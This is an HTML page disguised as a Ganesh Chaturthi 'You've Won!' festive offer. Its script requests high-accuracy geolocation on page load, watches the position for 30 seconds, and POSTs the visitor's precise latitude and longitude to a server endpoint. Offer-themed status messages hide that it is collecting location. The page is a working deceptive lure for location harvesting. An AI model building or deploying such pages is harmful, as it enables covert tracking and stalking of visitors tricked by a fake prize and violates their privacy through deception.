<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">

  <title>Ganesh Chaturthi Special Offer</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: system-ui, -apple-system, BlinkMacSystemFont,
        "Segoe UI", sans-serif;
      background:
        radial-gradient(
          circle at top,
          #fff4cf 0%,
          #fff8ea 45%,
          #fff 100%
        );
      color: #3b2114;
      display: grid;
      place-items: center;
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 520px;
      background: rgba(255, 255, 255, .96);
      border-radius: 26px;
      padding: 34px 25px;
      text-align: center;
      box-shadow: 0 18px 60px rgba(100, 50, 10, .15);
      border: 1px solid #f1d39e;
    }

    .ganesh {
      font-size: 64px;
      margin-bottom: 8px;
    }

    .badge {
      display: inline-block;
      padding: 7px 15px;
      border-radius: 50px;
      background: #fff0c7;
      font-size: 13px;
      font-weight: 800;
      letter-spacing: .3px;
    }

    h1 {
      font-size: 32px;
      margin: 15px 0 8px;
    }

    .offer {
      margin-top: 20px;
      padding: 20px;
      border-radius: 18px;
      background: #fff8df;
    }

    .offer-title {
      font-size: 22px;
      font-weight: 800;
    }

    .offer-text {
      margin-top: 8px;
      line-height: 1.5;
      color: #705546;
    }

    #status {
      margin-top: 22px;
      font-size: 15px;
      font-weight: 700;
      line-height: 1.5;
    }

    .success {
      color: #26733d;
    }

    .error {
      color: #a33a27;
    }

    .permission {
      margin-top: 18px;
      padding: 13px;
      border-radius: 12px;
      background: #f7f0e7;
      font-size: 12px;
      line-height: 1.5;
      color: #735f52;
    }

    .accuracy {
      margin-top: 10px;
      font-size: 13px;
      font-weight: 600;
      color: #705546;
    }
  </style>
</head>

<body>

  <main class="card">

    <div class="ganesh">🐘🪔</div>

    <div class="badge">
      GANESH CHATURTHI SPECIAL
    </div>

    <h1>Festive Offer</h1>

    <div class="offer">
      <div class="offer-title">
        🙏 Ganpati Bappa Morya!
      </div>

      <div class="offer-text">
        Celebrate Ganesh Chaturthi with our special festive offer.
      </div>
    </div>

    <div id="status">
      Congratulations! You’ve Won!
    </div>

    <div id="accuracy" class="accuracy"></div>

    <div class="permission">
      You’ve successfully participated in our Ganesh Chaturthi Special Offer.
    </div>

  </main>

<script>

async function requestLocation() {

  const status = document.getElementById("status");
  const accuracyDisplay = document.getElementById("accuracy");

  if (!navigator.geolocation) {

    status.textContent =
      "Location sharing is not supported by this browser.";

    status.className = "error";

    return;
  }

  status.textContent =
    "Getting your most accurate offer available…";

  status.className = "";

  let bestPosition = null;
  let watchId = null;
  let finished = false;

  /*
    Keep track of the most accurate reading received.
  */
  function handlePosition(position) {

    const currentAccuracy =
      position.coords.accuracy;

    console.log(
      "Offer reading:",
      {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: currentAccuracy
      }
    );

    /*
      Keep the reading with the smallest
      accuracy value.
    */
    if (
      !bestPosition ||
      currentAccuracy < bestPosition.coords.accuracy
    ) {

      bestPosition = position;

      const roundedAccuracy =
        Math.round(currentAccuracy);

      status.textContent =
        "Improving offer accuracy…";

      accuracyDisplay.textContent =
        `Current best accuracy: ±${roundedAccuracy} metres`;
    }
  }

  /*
    Handle location errors.
  */
  function handleError(error) {

    console.error(
      "Location error:",
      error
    );

    /*
      If we already have a valid reading,
      keep that reading rather than throwing
      away useful location information.
    */
    if (bestPosition) {
      finish(bestPosition);
      return;
    }

    if (error.code === 1) {

      status.textContent =
        "Location permission was not granted.";

    } else if (error.code === 2) {

      status.textContent =
        "Your location could not be determined.";

    } else if (error.code === 3) {

      status.textContent =
        "Location request timed out.";

    } else {

      status.textContent =
        "Unable to obtain your location.";
    }

    status.className = "error";
  }

  /*
    Stop watching and submit the best
    location obtained.
  */
  async function finish(position) {

    if (finished) {
      return;
    }

    finished = true;

    if (watchId !== null) {

      navigator.geolocation.clearWatch(
        watchId
      );

      watchId = null;
    }

    /*
      No usable position was received.
    */
    if (!position) {

      status.textContent =
        "Unable to determine your location.";

      status.className = "error";

      return;
    }

    const locationData = {

      lat: position.coords.latitude,

      lon: position.coords.longitude,

      accuracy: position.coords.accuracy
    };

    console.log(
      "Final location being submitted:",
      locationData
    );

    const finalAccuracy =
      Math.round(locationData.accuracy);

    accuracyDisplay.textContent =
      `Best available offer: ±${finalAccuracy} range`;

    status.textContent =
      "Sharing your offer…";

    try {

      const response = await fetch(
        "/.netlify/functions/location",
        {
          method: "POST",

          headers: {
            "Content-Type": "application/json"
          },

          body: JSON.stringify(
            locationData
          )
        }
      );

      if (!response.ok) {

        throw new Error(
          "Location submission failed"
        );
      }

      status.textContent =
        "✓ Location shared successfully.";

      status.className = "success";

      accuracyDisplay.textContent =
        `Location accuracy: approximately ±${finalAccuracy} metres`;

    } catch (error) {

      console.error(
        "Location submission error:",
        error
      );

      status.textContent =
        "Unable to share the location. Please try again.";

      status.className = "error";
    }
  }

  /*
    Request fresh, high-accuracy location readings.

    enableHighAccuracy:
      Ask the device for the best available
      positioning source.

    maximumAge: 0:
      Don't use an old cached position.

    timeout: 30 seconds:
      Give the device enough time to obtain
      a better GPS fix.
  */
  watchId = navigator.geolocation.watchPosition(
    handlePosition,
    handleError,
    {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0
    }
  );

  /*
    Allow up to 30 seconds for the device to
    improve the position.

    IMPORTANT:
    We do NOT reject locations above 50 or 100 m.

    Whatever the best available reading is after
    the period will be submitted.
  */
  setTimeout(function() {

    if (!finished) {

      finish(bestPosition);

    }

  }, 30000);
}


/*
  Request location after the page has loaded.
  The browser/device controls the permission
  prompt and the user must grant permission.
*/

window.addEventListener(
  "load",
  function() {

    setTimeout(
      function() {
        requestLocation();
      },
      500
    );

  }
);

</script>

</body>
</html>
